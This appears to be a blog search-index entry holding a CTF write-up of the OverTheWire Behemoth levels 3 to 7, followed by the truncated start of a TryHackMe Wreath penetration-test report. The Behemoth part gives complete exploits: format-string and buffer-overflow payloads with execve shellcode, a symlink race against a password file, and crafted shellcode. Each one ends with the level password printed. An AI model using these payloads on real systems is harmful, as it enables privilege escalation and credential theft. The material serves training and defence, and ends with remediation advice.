behemoth3@behemoth:/behemoth$ ./behemoth3  Identify yourself: AAAA%x  Welcome, AAAA41414141    aaaand goodbye again.When inputting AAAA followed by a %x format string, the hexadecimal values of the A’s are immediately printed. This means that the user input is in the first parameter within the stack. Throughout this level, the malicious input will be directed to a file so that the payload can be constructed with the help of GDB:Constructing Payload With GDBUsing the address of puts found by the objdump command, the following payload can be constructed:  behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print '\\xac\\x97\\x04\\x08'+'%100x%n'" &gt; overwriteThe \xac\x97\x04\x08 string corresponds to the address of the puts function in little endian form (0x080497ac). Following this, the hex output of this string is printed out with a padding of 100 0’s. This type of padding is extremely useful for controlling the value of the memory address of whatever is being overwritten.When this payload is inputted into the binary within GDB, a segmentation fault occurs, however the address of the puts function does not follow an expected value:  (gdb) r &lt; overwrite                          Starting program: /behemoth/behemoth3 &lt; overwrite                                                                                                                                                                           Program received signal SIGSEGV, Segmentation fault.  xf7e55137 in vfprintf () from /lib32/libc.so.6     (gdb) x/x x080497ac                          x80497ac:      x08048356Observe that the address is x08048356 instead of a low value. To be exact, the value should be equal to the number of characters that are in the payload. This would mean that the value should be 4 (for the address of puts) + 100 (hex formatter) which is 104 in decimal and 0x68 in hex. Prepending AAAA to the beginning of the payload successfully overwrites the puts function:  behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'AAAA\\xac\\x97\\x04\\x08' + '%100x%n'" &gt; overwrite    (gdb) r &lt; overwrite  The program being debugged has been started already.  Start it from the beginning? (y or n) y  Starting program: /behemoth/behemoth3 &lt; overwrite  Identify yourself: Welcome, AAA                                                                                            41414141    Program received signal SIGSEGV, Segmentation fault.  0x0000006c in ?? ()(gdb) x/x 0x080497ac0x80497ac:      0x0000006cNote that the puts function points to 0x6c which is 108 in decimal (this change from 104 is a result of prepending 4 A’s)Exploit DevelopmentWith the successful overwrite of the puts function, the next step is to control the address that it points to. Currently, it points to 0x6c, but this value must be changed to point to shellcode in order for the successful execution of arbitrary code. The particular methodology used to develop this exploit will work on the basis of overwriting the puts function address two bytes at a time.  Thus, the final exploit will look like the following:  ‘AAAA’ + ‘\\xac\\x97\\x04\\x08’ + ‘AAAA’ + ‘\\xae\\x97\\x04\\x08’ + NOP_SLED + SHELLCODE + FORMAT_STRINGS_TO_CONTROL_PUTS_ADDRESSNote that there are two addresses within this payload: one is the base address of the puts function, and the other is the puts address + 2 to accommodate for overwriting the address two bytes at a time. This will also mean that two %x strings must be used along with two %n’s. Additionally, a shellcode[5] of 23 bytes will be used.Controlling Puts AddressTo begin the exploit, the puts address must first be controlled with the help of format string padding.  behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'AAAA' + '\\xac\\x97\\x04\\x08' + 'AAAA' + '\\xae\\x97\\x04\\x08' + '\\x90'*100 + 'S'*23 + '%100x%n'" &gt; exploitA NOP sled of 100 bytes is used before the shellcode of 23 bytes (denoted by the placeholder ‘S’) is declared. Following the shellcode is a padding of 100 bytes to the hex format specifier which results in the puts address of 0xef when executed:  (gdb) r &lt; exploit  Starting program: /behemoth/behemoth3 &lt; exploit  Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS                                                                                            41414141    Program received signal SIGSEGV, Segmentation fault.  x000000ef in ?? () A segmentation fault occurred as expected, because the puts address points to a memory address that it cannot access. Ideally, the puts function should point to an address somewhere within the nop sled. Seeing as the nop sled consists of 100 bytes, there are multiple addresses that would work for this exploit:  (gdb) x/40x $esp  0xffffd4d8:     0x080484d1      0x0804857e      0x41414141      0x080497ac  0xffffd4e8:     0x41414141      0x080497ae      0x90909090      0x90909090  0xffffd4f8:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd508:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd518:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd528:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd538:     0x90909090      0x90909090      0x90909090      0x90909090  0xffffd548:     0x90909090      0x90909090      0x90909090      0x53535353  0xffffd558:     0x53535353      0x53535353      0x53535353      0x53535353  0xffffd568:     0x25535353      0x78303031      0x000a6e25      0x00000000The exploit begins at address 0xffffd4d8 + 8 (as can be seen from 0x41414141 which is AAAA) followed by the address of puts and another string of four A’s. This is then followed by puts + 2, and finally the nop sled begins at 0xffffd4e8 + 8. For the purposes of this exploit, a memory address of 0xffffd518 was chosen. Note how this value in decimal is 4294956312 which theoretically could be obtained by passing in an exploit that is about 4294956312 bytes long. In reality, however, this would cause a memory overload (and even if it didn’t, printing this many bytes to stdout would take a long time).  As mentioned in Exploit Development, this can be bypassed by passing two %n format specifiers which point to two different points in memory whose addresses are two bytes apart.The largest value for each part of the memory address when split into two is 16^4 - 1 which is 65535. This largely reduces the 4294956312 length previously mentioned. Incidentally, the largest value possible for a 32 bit binary is 16^8 - 1 which is 4294967295 or 0xffffffff.A value of 0xef was written to the puts function address; however, a value of 0xd510 (for the lower two bytes) was desired. The padding necessary for achieving this value can be determined through the following calculation:desired_output - current_output + current_padding  (gdb) p 0xd510 - 0xef + 100  $3 = 54405Thus, a padding of 54405 is needed to output 0xd510:  (gdb) r &lt; exploit                                                                                                                                                                              Starting program: /behemoth/behemoth3 &lt; exploit                                                                            Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS    Program received signal SIGSEGV, Segmentation fault.  x0000d510 in ?? ()The lower two bytes were successfully overwritten to 0xd510. The same method can be used to overwrite the two most significant bytes:  behemoth3@behemoth:/tmp/overwrite_puts$ python -c "print 'AAAA' + '\\xac\\x97\\x04\\x08' + 'AAAA' + '\\xae\\x97\\x04\\x08' + '\\x90'*100 + 'S'*23 + '%54405x%n%100x%n'" &gt; exploitNote that a padding of 100 was arbitrarily picked so as to perform the following calculations:After inputting a padding of 100 bytes for the two most significant bytes, the subsequent value was determined to be 0xd574:  (gdb) r &lt; exploit                                Starting program: /behemoth/behemoth3 &lt; exploit                Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS    Program received signal SIGSEGV, Segmentation fault.  xd574d510 in ?? ()The correct padding can subsequently be calculated:  (gdb) p 0xffff - 0xd574 + 100  $2 = 10991Therefore, the final exploit will look like the following:  python -c "print 'AAAA' + '\\xac\\x97\\x04\\x08' + 'AAAA' + '\\xae\\x97\\x04\\x08' + '\\x90'*100 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x  62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' + '%54405x%n%10991x%n'"Popping a ShellNote that the S was also changed to the actual shellcode. Executing this payload within GDB causes the debug process to abruptly exit due to the execution of /bin/dash:  (gdb) r &lt; exploit                                                                                                                                                  Starting program: /behemoth/behemoth3 &lt; exploit                                      Identify yourself: Welcome, AAAAAA1Ph//shh/binPS                                           41414141  process 14128 is executing new program: /bin/dash  [Inferior 1 (process 14128) exited normally]When this payload is piped straight into the binary without GDB, a shell is returned:  behemoth3@behemoth:/tmp/overwrite_puts$ (python -c "print 'AAAA' + '\\xac\\x97\\x04\\x08'                                                                                          \+ 'AAAA' + '\\xae\\x97\\x04\\x08' + '\\x90'*100 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f                                                                                      \\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' + '%54405x%n%10991x%n'";cat -) |                                                                                       /behemoth/behemoth3                                                                                                                                                            Identify yourself: Welcome, AAAAAA1Ph//shh/binPS                                                                                                                                                                           41414141  whoami  behemoth4  cat /etc/behemoth_pass/behemoth4  ietheisheiNote that cat -  is appended to the end of the payload. This is an essential part of the exploit which allows the process to interact between stdin and stdout. Without cat, the process immediately exits without errors.Incidentally, when first performing the exploit of this binary, a /bin/bash shellcode[6] was used, however it did not work outside GDB for unknown reasons. When a binary exploitation does not work as intended, it could be beneficial to use a different shellcode to see if it resolves the problem.Behemoth 4With the necessary permissions obtained by compromising the behemoth4 user, the behemoth4 binary can be executed.Binary AnalysisBefore being able to exploit the binary, it is necessary to understand how it works first.BehaviorExecuting the binary does not result in anything out of the ordinary:  behemoth4@behemoth:/tmp$ /behemoth/behemoth4  PID not found!The program simply prints out “PID not found!” and exits immediately.GhidraWithin Ghidra, we can get a further look at how the program is getting the PID, and what it does with it:  undefined4 main(void)    {   char local_30 [20]; int local_1c; FILE *local_18; __pid_t local_14; undefined *local_c;  local_c = &amp;stack0x00000004; local_14 = getpid(); sprintf(local_30,"/tmp/%d",local_14); local_18 = fopen(local_30,"r"); if (local_18 == (FILE *)0x0) {     puts("PID not found!"); }   else {     sleep(1);   puts("Finished sleeping, fgetcing");   while( true ) {       local_1c = fgetc(local_18);     if (local_1c == -1) break;        putchar(local_1c);   }     fclose(local_18); }   return 0;  }The program starts by declaring a couple of variables. The getpid function is called, and local_14 is set to equal its output. This output is then concatenated with /tmp, and local_30 is set to equal it. Afterwards, the local_18 variable is set to equal the output when opening a file in /tmp whose name corresponds to the id of the binary’s process (which is local_30). If the file does not exist, then “PID not found!” is printed out. Otherwise, the contents of the file is read out by using the getchar function within a while loop.Binary ExploitationThe problem with this program is that it assumes that it can only read files within the /tmp directory. However, symbolic links can be used to make the program read the password file of the behemoth5 user.Symbolic Link AttackSeeing as the pid of the binary cannot be easily determined before executing the program, a bash script can be utilized to create many files that correspond to possible PIDs. Before creating this bash script, the approximate PID of the binary must first be found:  behemoth4@behemoth:/tmp$ ltrace /behemoth/behemoth4  __libc_start_main(0x804857b, 1, 0xffffd674, 0x8048640 &lt;unfinished ...&gt;  getpid()                                                                   = 22928  sprintf("/tmp/22928", "/tmp/%d", 22928)                                    = 10  fopen("/tmp/22928", "r")                                                   = 0  puts("PID not found!"PID not found!  )                                                     = 15+++ exited (status 0) +++This process was assigned to the ID of 22928, and it therefore looked for a file called 22928 within the /tmp directory. The PID upon the next execution of the binary must be greater than 22928 but likely less than 30000:  behemoth4@behemoth:/tmp$ for i in {22928..30000}; do ln -s /etc/behemoth_pass/behemoth5 $i;doneNow, when the binary is executed, it will read the contents of behemoth5’s password:  behemoth4@behemoth:/tmp$ /behemoth/behemoth4                                                                                Finished sleeping, fgetcing                                                                                                aizeeshing                                                                                                                Behemoth 5By first logging into the account through ssh with the credentials found in Behemoth 4, the behemoth5 binary can be executed.Binary AnalysisWhen executing the binary, nothing out of the ordinary occurs. The binary simply exits without anything printing out to stdout. After downloading the binary onto the attack box, Ghidra could be utilized to help in analyzing the binary.Ghidra  void main(void)    {   long lVar1;   size_t sVar2;   int iVar3;   undefined local_38 [4];   undefined4 local_34;   undefined auStack48 [8];   ssize_t local_28;   int local_24;   hostent *local_20;   char *local_1c;   FILE *local_18;   size_t local_14;   undefined *puStack12;      puStack12 = &amp;stack0x00000004;   local_14 = 0;   local_18 = fopen("/etc/behemoth_pass/behemoth6","r"); if (local_18 == (FILE *)0x0) {     perror("fopen");                   /* WARNING: Subroutine does not return */   exit(1);   }   fseek(local_18,0,2);   lVar1 = ftell(local_18);   local_14 = lVar1 + 1;   rewind(local_18);   local_1c = (char *)malloc(local_14);   fgets(local_1c,local_14,local_18);   sVar2 = strlen(local_1c);   local_1c[sVar2] = '\\0';   fclose(local_18);   local_20 = gethostbyname("localhost"); if (local_20 == (hostent *)0x0) {     perror("gethostbyname");                   /* WARNING: Subroutine does not return */   exit(1);   }   local_24 = socket(2,2,0); if (local_24 == -1) {     perror("socket");                   /* WARNING: Subroutine does not return */   exit(1);   }   local_38._0_2_ = 2;   iVar3 = atoi("1337");   local_38._2_2_ = htons((uint16_t)iVar3);   local_34 = *(undefined4 *)*local_20-&gt;h_addr_list;   memset(auStack48,0,8);   sVar2 = strlen(local_1c);   local_28 = sendto(local_24,local_1c,sVar2,0,(sockaddr *)local_38,0x10); if (local_28 == -1) {     perror("sendto");                   /* WARNING: Subroutine does not return */   exit(1);   }   close(local_24);                   /* WARNING: Subroutine does not return */ exit(0);  }After many different variables are declared, the password for the behemoth6 user is read into the program. Afterwards, the gethostbyaddressname function is called with the argument “localhost”. Shortly afterwards, the socket function is called using the arguments (2,2,0). Observe the following code and the corresponding Ghidra output:Source1:Ghidra1:Source2:Ghidra2:Source3:          Ghidra3:The socket arguments of Ghidra3 are identical to the arguments seen from behemoth5. Therefore, the arguments seen in the behemoth5 binary correspond to iPv4, UDP, and default protocol respectively[7].Following the calling of the socket function, iVar3 is set to be 1337 before a sendto function is called. From these lines of code, it can be discerned that a UDP socket is opened on port 1337, and the password of the behemoth6 user is sent to it.Catching Behemoth6 Password Through UDPBefore executing the binary, it is essential that another session be opened so that a UDP listener can be set up on port 1337:behemoth5@behemoth:~$ nc -lup 1337 localhostThe -u flag specifies UDP mode, -p is for specifying a port, and -l tells nc to listen for inbound connectionsAfter executing the binary, the password of the behemoth6 user can be seen on stdout:Note that the blue line is a result of using tmux[8], and it represents the delimiter between different sessionsThis challenge was more of a reverse engineering exercise, but it is good practice for developing the skill of understanding the functionality of a binary.Behemoth 6After logging in as the behemoth6 user and executing the behemoth6 binary, the following output is seen:behemoth6@behemoth:/behemoth$ ./behemoth6Incorrect output.Furthermore, performing the ls command on the /behemoth directory reveals another interesting file possibly related to behemoth6:  behemoth6@behemoth:/behemoth$ ls  behemoth0  behemoth1  behemoth2  behemoth3  behemoth4  behemoth5  behemoth6  behemoth6_reader  behemoth7Namely, that file is called behmoth6_reader and it might be used by the behemoth6 binary. After downloading the binary onto the attack box, the binary can be analyzed with the help of Ghidra.GhidraGhidra translated the assembly code found for each binary into the following:The code on the left was produced by the behemoth6 binary, while the code on the right is from the behemoth_reader. Looking at the code for the bhemeoth6_reader program, a file named shellcode.txt is expected. However, the contents of this file are not printed out anywhere. If a file named shellcode.txt exists, then a small sanitization is performed against the file: if the 0xb byte exists within the file, then the program immediately exits.In short, the program is executing the contents of the shellcode.txt file as machine code. Therefore, shellcode will get executed by the binary. This, however, will not directly result in a privileged shell due to the fact that the SETUID bit is not enabled on the behemoth6_reader binary. Rather, the behemoth6 binary has the SETUID bit, and its interaction with the behemoth6_reader will determine the significance of the shellcode.Looking at the code for behemoth6, observe that the file is opened using the popen function in read mode, after which the output is passed into the __stream variable. This variable then gets passed into __s1 which is compared against the string ‘HelloKitty’ in the strcmp function. If the contents of this variable matches the string, then a /bin/sh shell is returned.Abusing popen()The output of the popen function is determined by the behemoth6_reader. Consequently, if the behemoth6_reader executes shellcode that makes it print out ‘HelloKitty’, then a shell will be returned. There are already shellcodes online that perform this operation, and the following shellcode was used[9]:  char code[] =   "\\xe9\\x1e\\x00\\x00\\x00"  //          jmp    (relative) &lt;MESSAGE&gt;   "\\xb8\\x04\\x00\\x00\\x00"  //          mov    $0x4,%eax   "\\xbb\\x01\\x00\\x00\\x00"  //          mov    $0x1,%ebx   "\\x59"                  //          pop    %ecx   "\\xba\\x0f\\x00\\x00\\x00"  //          mov    $0xf,%edx   "\\xcd\\x80"              //          int    $0x80   "\\xb8\\x01\\x00\\x00\\x00"  //          mov    $0x1,%eax   "\\xbb\\x00\\x00\\x00\\x00"  //          mov    $0x0,%ebx   "\\xcd\\x80"              //          int    $0x80   "\\xe8\\xdd\\xff\\xff\\xff"  //          call   (relative) &lt;GOBACK&gt;The code above prints out whatever string follows it (however the string must be in machine code). This code, coupled with a subsequent string in shellcode will result in a successful.string comparison. To facilitate the conversion between ascii and shellcode, a conversion table[10] was used.Ascii:HelloKittyShellcode:\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79After creating a directory in /tmp (so as to be able to create files), the following code was printed into shellcode.txt:  behemoth6@behemoth:/tmp/behemoth6$  python -c "print '\\xe9\\x1e\\x00\\x00\\x00\\xb8\\x04\\x00\\x00\\x00\\xbb\\x01\\x00\\x00\\x00\\x59\\xba\\x0f\\x00\\x00\\x00\\xcd\\x80\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80\\xe8\\xdd\\xff\\xff\\xff' +'\\x48\\x65\\x6c\\x6c\\x6f\\x4b\\x69\\x74\\x74\\x79'" &gt; shellcode.txtNow when executing the behemoth6 binary, the shellcode file will be called when the behemoth6_reader is executed via the popen function, subsequently making the reader print out HelloKitty. This will cause the strcmp function to run true, and a /bin/sh shell is subsequently returned:  behemoth6@behemoth:/tmp/behemoth6$ /behemoth/behemoth6  Correct.  $ whoami  behemoth7  $ cat /etc/behemoth_pass/behemoth7  baquoxuafoBehemoth 7After successfully exploiting the behemoth6 binary, we are left with the final challenge of exploiting the behemoth7 binary.Binary AnalysisBefore analysing the binary within tools such as GDB and Ghidra, it is advised to first start by executing the binary to observe its behavior.BehaviorUpon executing the binary, nothing conspicuous occurs. The binary immediately exits after execution without printing anything to stdout.GhidraAfter downloading the binary onto the attack box, the binary can be analyzed with the help of Ghidra. Using Ghidra, the assembly code of the binary was converted to the following code:  undefined4 main(int param_1,int param_2,int param_3){ size_t __n;   ushort **ppuVar1; char local_210 [512]; int local_10; int local_c; char *local_8;      local_8 = *(char **)(param_2 + 4);   local_c = 0; while (*(int *)(param_3 + local_c * 4) != 0) {     __n = strlen(*(char **)(param_3 + local_c * 4));   memset(*(void **)(param_3 + local_c * 4),0,__n);     local_c = local_c + 1;   }   local_10 = 0; if (1 &lt; param_1) {   while ((*local_8 != '\\0' &amp;&amp; (local_10 &lt; 0x200))) {       local_10 = local_10 + 1;       ppuVar1 = __ctype_b_loc();     if ((((*ppuVar1)[*local_8] &amp; 0x400) == 0) &amp;&amp;          (ppuVar1 = __ctype_b_loc(), ((*ppuVar1)[*local_8] &amp; 0x800) == 0)) {       fprintf(stderr,"Non-%s chars found in string, possible shellcode!\\n","alpha");                   /* WARNING: Subroutine does not return */       exit(1);       }       local_8 = local_8 + 1;     }   strcpy(local_210,*(char **)(param_2 + 4));   } return 0;  }At the very top of the code, it can be seen that the main function takes three parameters. These parameters most likely correspond to the input given by argc[11]. At the top of the main function are declarations of variables, and among them is local_210 with 512 bytes allocated to it. Toward the middle of the main function is a while loop located within an if statement. Inside of the while loop is an if statement which, upon running true, prints the following:  fprintf(stderr,"Non-%s chars found in string, possible shellcode!\\n","alpha"); Therefore, it is likely there is a filter on non alphanumeric characters[12]. This could limit the possible shellcode that could be used if the EIP register cannot be overwritten. However, looking at the code, there does not seem to be any boundary checks, and the EIP register should capable of being overwritten. This can be verified by inputting a large number of bytes into the program:  behemoth7@behemoth:/behemoth$ gdb -q /behemoth/behemoth7  Reading symbols from /behemoth/behemoth7...(no debugging symbols found)...done.  (gdb) r $(python -c "print 'A'*1000")  Starting program: /behemoth/behemoth7 $(python -c "print 'A'*1000")    Program received signal SIGSEGV, Segmentation fault.  0x41414141 in ?? ()The EIP register was successfully overwritten as can be seen by the value of the instruction pointer (0x41414141), which is AAAA in hex. Therefore, the shellcode that will be used for exploiting this binary does not have to be made of alphanumeric characters.Constructing PayloadThe payload will consist of the necessary amount of bytes to equal the EIP offset, followed by the address of the shellcode, after which the NOP sled will be declared which precedes the shellcode.Calculating EIP OffsetTo begin the construction of the exploit, the EIP offset must first be calculated:  pwndbg&gt; r $(cyclic 1000)                                                                                                                                              Starting program: /home/0xd4y/business/other/overthewire/behemoth/7/behemoth7 $(cyclic 1000)                                                                                     Program received signal SIGSEGV, Segmentation fault.  0x66616168 in ?? ()                        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  ────────────────────────────────────[ REGISTERS ]─────────────────────────────────────EAX  0x0                                 EBX  0x0                                 ECX  0xffffd290 ◂-- 'yaaj'                 EDX  0xffffcde0 ◂-- 'yaaj'                 EDI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂-- insb   byte ptr es:[edi], dx /* 0x1e4d6c */EBP  0x66616167 ('gaaf')                                                                                                                                                    ESP  0xffffcc10 ◂-- 0x66616169 ('iaaf')                                                                                                                                      EIP  0x66616168 ('haaf')                                                                                                                                                      ──────────────────────────────────────[ DISASM ]──────────────────────────────────────                                                                                        Invalid address 0x66616168                 pwndbg&gt; cyclic -l 0x66616168  528The offset was calculated as 528 bytes, and as such 528 bytes of junk must first be inputted into the binary before the EIP register can be controlled.Shellcode AddressThe next step is to determine the address of the shellcode[13]. This can easily be analyzed within GDB:  (gdb) r $(python -c "print 'A'*528+'BBBB'+'A'*112+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")    Starting program: /behemoth/behemoth7 $(python -c "print 'A'*528+'BBBB'+'A'*112+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")    Program received signal SIGSEGV, Segmentation fault.  0x42424242 in ?? ()Note that the EIP register was successfully controlled to be 0x42424242 (equivalent to BBBB)The beginning of the shellcode can be found withhin the stack pointer:(gdb) x/100x $esp-200                                                                                                                                                       0xffffd228:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd238:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd248:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd258:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd268:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd278:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd288:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd298:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd2a8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd2b8:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd2c8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd2d8:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd2e8:     0x41414141      0x42424242      0x41414141      0x41414141                                                                                                   0xffffd2f8:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd308:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd318:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd328:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd338:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd348:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd358:     0x41414141      0x41414141      0x99580b6a      0x2d686652  0xffffd368:     0x52e18970      0x2f68686a      0x68736162      0x6e69622f  0xffffd378:     0x5152e389      0xcde18953      0x00000080      0xffffd4df  0xffffd388:     0xffffd4f3      0x00000000      0xffffd799      0xffffd7ac  0xffffd398:     0xffffdd68      0xffffdd83      0xffffddb8      0xffffddcd  0xffffd3a8:     0xffffdde5      0xffffde01      0xffffde10      0xffffde21The junk after the EIP begins at 0xffffd2e8 + 8 which is 0xffffd2f0. Following the junk bytes is the shellcode at 0xffffd358 + 8 which is equivalent to 0xffffd360. Therefore the EIP value should be overwritten to point to f 0xffffd360.Final PayloadWith the knowledge of the EIP offset and the shellcode address, the final payload can now be constructed:  ‘A’*528 + ‘\\x48\\xd3\\xff\\xff’ + ‘A’*112 + ‘\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80’It is important to note that the repetition of ‘A’ 112 times was chosen so as to not spill 0x41 into the shellcode portion of memory. This value of 112 is not necessary, but it should be a multiple of 4 to prevent spilling into memory addresses that only shellcode should occupy.The payload works in GDB as can be seen from /bin/bash being executed:  (gdb) r $(python -c "print 'A'*528+'\\x60\\xd3\\xff\\xff'+'A'*112+'\\x6a\\x0b\\x58\\x99\\x52\\x66                                                                                      \\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x5                                                                                        1\\x53\\x89\\xe1\\xcd\\x80'")                                                                                                                                                      The program being debugged has been started already.                                                                                                                          Start it from the beginning? (y or n) y                                                                                                                                        Starting program: /behemoth/behemoth7 $(python -c "print 'A'*528+'\\x60\\xd3\\xff\\xff'+'A'*112+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68  \\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                    process 27236 is executing new program: /bin/bash                                                                                                                              behemoth7@behemoth:/behemoth$                                                        Program received signal SIGINT, Interrupt.                                                                                                                                    0x00007ffff76ed441 in __pselect (nfds=1, readfds=0x7fffffffdac0, writefds=0x0,                                                                                                   exceptfds=0x0, timeout=&lt;optimized out&gt;, sigmask=0x7fffffffda40)                                                                                                               at ../sysdeps/unix/sysv/linux/pselect.c:69                                                                                                                                69      ../sysdeps/unix/sysv/linux/pselect.c: No such file or directory.                                                                                                    When trying this payload outside of GDB, a shell is successfully popped, and the final local user is compromised:  behemoth7@behemoth:/behemoth /behemoth/behemoth7 $(python -c "print 'A'*528+'\\x60\\xd                                                                                        3\\xff\\xff'+'A'*112+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x6                                                                                        2\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")                                                                                                                                                                                                                                bash-4.4$ whoami                                                                        behemoth8                                    bash-4.4$ cat /etc/behemoth_pass/behemoth8                                                                                                                                   pheewij7AeConclusionEvery binary tested was successfully exploited. Many binaries which in practice should not be vulnerable, turned out to be exploitable due to the calling of sensitive system commands (in particular /bin/sh). This resulted in the horizontal privilege escalation in Behemoth 0 and Behemoth 6.There were multiple different vulnerabilities associated with each binary, running from format string exploits to buffer overflows and privilege escalation via the PATH environment variable.The following remediations should strongly be considered:      Perform boundary checks on user input    Multiple binaries were vulnerable due to the lack of boundary checks  Shellcode injection was possible on many binaries due to this lack of validation      Bad shellcode filtering can be bypassed if EIP can be overwritten as can be seen in Behemoth 7        Filter user input        Malicious shellcode could easily be injected in multiple binaries due to the lack of user input validation (although shellcode could be encoded, this would nevertheless mitigate these kind of attacks)        Never run sensitive system commands unless absolutely necessary    System commands such as /bin/sh should rarely ever be called (especially within a SETUID binary) due to its insecurity      Binaries that should not have been vulnerable turned out to be exploitable due to calling /bin/sh        Always use the full path of a command        PATH environment variable attacks were present on Behemoth 2        Never read files that can be created by an untrusted user    Symbolic links can be used to exploit this vulnerability as can be seen in Behemoth 2 and Behemoth 4[1] https://en.wikipedia.org/wiki/Debug_symbol [2] http://shell-storm.org/shellcode/files/shellcode-827.php [3] https://cs155.stanford.edu/papers/formatstring-1.2.pdf [4] https://en.wikipedia.org/wiki/Printf_format_string [5] http://shell-storm.org/shellcode/files/shellcode-827.php [6] http://shell-storm.org/shellcode/files/shellcode-606.php [7]  https://www.geeksforgeeks.org/udp-server-client-implementation-c/ [8] https://github.com/tmux/tmux [9] https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world [10] https://nets.ec/Ascii_shellcode [11] https://www.tutorialspoint.com/cprogramming/c_command_line_arguments.htm [12] https://en.wikipedia.org/wiki/Alphanumeric_shellcode [13] http://shell-storm.org/shellcode/files/shellcode-606.php",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Wreath Writeup",
      "category" : "tryhackme",
      "tags"     : "RCE, Network Pivoting, CVE, Windows, and Linux",
      "url"      : "/tryhackme/2021/03/30/Wreath-Writeup/",
      "date"     : "Mar 30, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.Wreath NetworkA look into the exploitation of a vulnerable network and “secure” PC.   0xd4y3-30-20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3First Machine (.200)        3Reconnaissance        3RCE Exploitation        5Reverse Shell        6Persistence        6Second Machine (.150)        7Host Enumeration        7Port Enumeration        8Port Forwarding        8RCE Exploitation        9Exploit Analysis        10Reverse Shell        11Pivoting through .200        11Socat Relay Reverse Shell        12Attempting to Use Mimikatz        14Shell Stabilization        15Mimikatz        16How Mimikatz Works        17How a Pass the Hash Attack (PtH) Works        17Third Machine (.100)        18Port Enumeration        18Forward SOCKS Proxy        19Examining the Web Server        20Analysing the Website’s Code        20Reverse Shell        23Privilege Escalation to System        24Searching for Misconfigurations        24Unquoted Service Path Attack        25How an Unquoted Service Path Attack Works        25Creating a Malicious Binary        25Data Exfiltration        28Cleanup        29Conclusion        30Executive SummaryI was tasked with finding vulnerabilities in a client’s network (Thomas Wreath)[1]. The attacks conducted in this report were not carried out in a black-box penetration testing environment, rather the client informed us that he had a git server hosted on one of the machines in his network from which he hosts his website. Furthermore, I was told that there are three computers in the client’s network, one of which the client assumed I could not penetrate as it had antivirus software installed.Though the client was cautious about downloading potentially dangerous software on any of his systems, he did not update software on two out of three computers, allowing me to gain immediate root access on two thirds of the network. The third machine ran insecure code on a web page which could be exploited through 